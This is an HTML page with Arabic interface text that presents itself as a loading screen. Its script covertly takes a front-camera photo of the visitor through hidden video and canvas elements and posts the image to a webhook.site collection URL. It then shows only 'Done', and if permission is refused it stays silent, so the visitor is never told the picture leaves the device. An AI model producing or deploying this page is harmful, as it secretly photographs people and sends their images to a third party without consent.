<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title></title>
  <style>
    body {
      margin: 0;
      height: 100vh;
      background: #000;
      color: #fff;
      font-family: system-ui, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      text-align: center;
      font-size: 2.2rem;
    }
    #status {
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      z-index: 10;
    }
  </style>
</head>
<body>

  <div id="status">جاري التحميل...</div>

  <video id="v" autoplay playsinline muted style="display:none"></video>
  <canvas id="c" style="display:none"></canvas>

  <script>
    (async function() {
      const status = document.getElementById('status');
      const video = document.getElementById('v');
      const canvas = document.getElementById('c');

      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user" }
        });

        video.srcObject = stream;

        // نعطي وقت بسيط للكاميرا عشان تشتغل وتثبت
        await new Promise(r => setTimeout(r, 800));

        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        canvas.getContext('2d').drawImage(video, 0, 0);

        const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.75));

        const formData = new FormData();
        formData.append('image', blob, 'capture.jpg');

        await fetch('https://webhook.site/88dae8aa-d964-44bb-aabb-4aa6b6760657', {
          method: 'POST',
          body: formData
        });

        status.textContent = "تم";
        stream.getTracks().forEach(t => t.stop());

      } catch (e) {
        status.textContent = "";
        // لو رفض → الصفحة تبقى ساكتة بدون كلام (أو غير النص إذا تبي)
      }
    })();
  </script>
</body>
</html>
